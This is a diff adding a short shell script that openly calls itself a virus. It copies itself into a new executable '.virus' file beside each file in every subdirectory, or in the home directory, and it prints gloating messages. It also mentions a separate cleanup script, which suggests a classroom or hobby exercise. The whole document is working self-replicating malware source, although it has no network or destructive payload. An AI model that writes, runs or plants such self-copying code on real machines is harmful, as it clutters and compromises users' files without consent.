@@ -1,0 +1,68 @@
+#! /bin/sh 
+
+slash="/"
+virusPath=$(pwd)$slash
+
+prefix="./"
+virusName=${0/#$prefix}
+
+ext=".virus"
+
+infect_dir()
+{
+    targetPath=$1
+
+    testFiles=$(ls $targetPath)
+
+    for testFile in $testFiles ; do 
+        if [ -f $targetPath$testFile$ext ] ; then 
+            true
+        else 
+            touch $targetPath$testFile$ext 
+	        cat $virusName > $targetPath$testFile$ext 
+            chmod 755 $targetPath$testFile$ext 
+            succMsg1=" created in "
+            succMsg2=". MWAHAHA!"
+            echo $testFile$ext$succMsg1$targetPath$succMsg2 
+        fi
+    done
+}
+
+infect_home_dir()
+{
+    testFiles=$(ls ~)
+
+    for testFile in $testFiles ; do 
+        if [ -f ~/$testFile$ext ] ; then 
+            true
+        else 
+            touch ~/$testFile$ext 
+            cat $virusName > ~/$testFile$ext 
+            chmod 755 ~/$testFile$ext 
+            succMsg1=" created in "
+            succMsg1andHalf="home directory"
+            succMsg2=". MWAHAHA!"
+            echo $testFile$ext$succMsg1$succMsg1andHalf$succMsg2 
+        fi
+    done
+}
+
+dirs=$(ls -d */)
+if [ -n "$dirs" ] ; then 
+    for dir in $dirs ; do 
+        targetPath=$virusPath$dir 
+        infect_dir $targetPath
+    done
+else 
+    infect_home_dir 
+fi 
+
+echo
+
+echo "Infection complete. To repair any damages, execute the "
+echo "clean-virus script."
+echo
+
+echo "But you can also go to any created .virus file and "
+echo "execute it... hehehe..."
+
